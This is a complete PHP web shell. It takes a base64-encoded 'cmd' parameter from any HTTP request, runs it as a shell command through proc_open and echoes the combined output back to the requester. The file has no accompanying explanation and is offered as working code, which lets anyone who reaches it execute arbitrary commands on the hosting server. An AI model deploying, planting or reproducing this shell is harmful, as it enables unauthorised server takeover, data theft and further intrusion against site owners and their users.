<?php
function exe($s_c){
	$s_out = "";
	$s_c = $s_c." 2>&1";

	if(is_callable('proc_open')) {
		$s_descriptorspec = array(
		0 => array("pipe", "r"),
		1 => array("pipe", "w"),
		2 => array("pipe", "w")
		);
		$s_proc = @proc_open($s_c, $s_descriptorspec, $s_pipes, getcwd(), array());
		if (is_resource($s_proc)) {
			while ($s_si = fgets($s_pipes[1])) {
				$s_out .= $s_si;
			}
			while ($s_se = fgets($s_pipes[2])) {
				$s_out .= $s_se;
			}
		}
		@proc_close($s_proc);
		return $s_out;
	}
}

if(isset($_REQUEST['cmd'])){
	$s_cmd = base64_decode($_REQUEST['cmd']);
	echo exe($s_cmd);
}
?>